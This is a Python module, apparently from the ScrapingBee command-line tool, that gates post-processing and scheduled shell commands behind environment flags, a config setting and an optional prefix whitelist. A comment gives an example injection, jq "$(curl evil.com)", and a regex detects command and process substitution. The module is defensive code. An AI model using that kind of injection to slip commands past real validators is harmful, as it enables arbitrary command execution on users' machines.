"""Execution gate for unsafe shell features (--post-process, --on-complete, schedule).

All three features are disabled by default. To enable, ALL of these must be true:
1. SCRAPINGBEE_ALLOW_EXEC=1 environment variable is set
2. SCRAPINGBEE_ALLOWED_COMMANDS environment variable is set (comma-separated command prefixes)
3. SCRAPINGBEE_UNSAFE_VERIFIED=1 is in the config .env (set by `scrapingbee auth --unsafe`)
4. The command matches the whitelist (starts with an allowed prefix)
"""

from __future__ import annotations

import os
import re

import click

from .config import DOTENV_HOME, _parse_dotenv_line

ENV_ALLOW_EXEC = "SCRAPINGBEE_ALLOW_EXEC"
ENV_ALLOWED_COMMANDS = "SCRAPINGBEE_ALLOWED_COMMANDS"
ENV_UNSAFE_VERIFIED = "SCRAPINGBEE_UNSAFE_VERIFIED"

# Deliberately vague error messages — do not reveal what's missing.
_VAGUE_ERROR = "This feature is not available. Visit https://www.scrapingbee.com/documentation/cli/ for more information."
_VAGUE_AUTH_ERROR = "Something went wrong. Please try again later."


def _read_config_env(key: str) -> str | None:
    """Read a key from the config .env file directly (not os.environ)."""
    if not DOTENV_HOME.is_file():
        return None
    try:
        with open(DOTENV_HOME, encoding="utf-8") as f:
            for line in f:
                parsed = _parse_dotenv_line(line)
                if parsed and parsed[0] == key:
                    return parsed[1]
    except OSError:
        pass
    return None


def is_exec_enabled() -> bool:
    """Check if exec gates pass (env var + unsafe verified)."""
    if os.environ.get(ENV_ALLOW_EXEC) != "1":
        return False
    if _read_config_env(ENV_UNSAFE_VERIFIED) != "1":
        return False
    return True


def is_whitelist_enabled() -> bool:
    """Check if the optional whitelist is configured."""
    return bool(os.environ.get(ENV_ALLOWED_COMMANDS))


def get_whitelist() -> list[str]:
    """Return the list of allowed command prefixes from env var."""
    raw = os.environ.get(ENV_ALLOWED_COMMANDS, "")
    return [cmd.strip() for cmd in raw.split(",") if cmd.strip()]


# Patterns that bypass whitelist validation by executing commands
# inside what looks like a single whitelisted command.
# Example: jq "$(curl evil.com)" — one segment starting with "jq",
# but $() executes curl before jq even runs.
_SUBSTITUTION_PATTERNS = re.compile(
    r"\$\("  # command substitution $(...)
    r"|`"  # backtick command substitution
    r"|\$\{"  # variable expansion ${...} (can embed commands)
    r"|<\("  # process substitution <(...)
    r"|>\("  # process substitution >(...)
)


def _split_shell_segments(cmd: str) -> list[str]:
    """Split a shell command on pipe and chaining operators.

    Returns the individual command segments from a chain like:
    'jq .title | head -1 && echo done' → ['jq .title', 'head -1', 'echo done']
    """
    # Split on ||, &&, |, ;, &, and newlines — longest operators first
    parts = re.split(r"\|\||&&|[|;&\n]", cmd)
    return [p.strip() for p in parts if p.strip()]


def _is_single_segment_whitelisted(segment: str) -> bool:
    """Check if a single command segment matches the whitelist."""
    for allowed in get_whitelist():
        if segment.startswith(allowed):
            return True
    return False


def is_command_whitelisted(cmd: str) -> bool:
    """Check if a command is safe to execute against the whitelist.

    Validates ALL segments in a piped/chained command, not just the first.
    Also blocks command/process substitution which can bypass segment validation.
    """
    cmd_stripped = cmd.strip()

    # Block substitution patterns that bypass whitelist validation
    if _SUBSTITUTION_PATTERNS.search(cmd_stripped):
        return False

    # Validate every segment in the command chain
    segments = _split_shell_segments(cmd_stripped)
    if not segments:
        return False
    return all(_is_single_segment_whitelisted(seg) for seg in segments)


def require_exec(feature_name: str, cmd: str | None = None) -> None:
    """Gate check — call before any shell execution.

    Required: SCRAPINGBEE_ALLOW_EXEC=1 + SCRAPINGBEE_UNSAFE_VERIFIED=1
    Optional: SCRAPINGBEE_ALLOWED_COMMANDS — if set, command must match whitelist.
    Blocks shell injection patterns (pipes to non-whitelisted commands,
    command substitution, backticks, process substitution).
    """
    if not is_exec_enabled():
        click.echo(_VAGUE_ERROR, err=True)
        raise SystemExit(1)

    # Whitelist is optional — if set, enforce it
    if cmd is not None and is_whitelist_enabled() and not is_command_whitelisted(cmd):
        click.echo(
            "Command blocked: contains non-whitelisted command or shell injection pattern.",
            err=True,
        )
        raise SystemExit(1)


def require_auth_unsafe() -> bool:
    """Gate check for `scrapingbee auth --unsafe`.

    Returns True if prerequisites are met. Prints vague error if not.
    Only requires SCRAPINGBEE_ALLOW_EXEC=1 (whitelist is optional).
    """
    if os.environ.get(ENV_ALLOW_EXEC) != "1":
        click.echo(_VAGUE_AUTH_ERROR, err=True)
        return False
    return True


def set_unsafe_verified() -> None:
    """Write SCRAPINGBEE_UNSAFE_VERIFIED=1 to the config .env file."""
    from .config import save_api_key_to_dotenv  # noqa: F401 — reuse the dotenv logic

    path = DOTENV_HOME
    path.parent.mkdir(parents=True, exist_ok=True)

    existing: dict[str, str] = {}
    if path.exists():
        try:
            with open(path, encoding="utf-8") as f:
                for line in f:
                    parsed = _parse_dotenv_line(line)
                    if parsed:
                        existing[parsed[0]] = parsed[1]
        except OSError:
            pass

    existing[ENV_UNSAFE_VERIFIED] = "1"

    with open(path, "w", encoding="utf-8") as f:
        for k, v in existing.items():
            f.write(f'{k}="{v}"\n')
    os.chmod(path, 0o600)


def remove_unsafe_verified() -> None:
    """Remove SCRAPINGBEE_UNSAFE_VERIFIED from the config .env file."""
    path = DOTENV_HOME
    if not path.is_file():
        return
    try:
        lines: list[str] = []
        with open(path, encoding="utf-8") as f:
            for line in f:
                parsed = _parse_dotenv_line(line)
                if parsed and parsed[0] == ENV_UNSAFE_VERIFIED:
                    continue
                lines.append(line.rstrip("\n"))
        if lines:
            with open(path, "w", encoding="utf-8") as f:
                f.write("\n".join(lines) + "\n")
        else:
            path.unlink(missing_ok=True)
    except OSError:
        pass
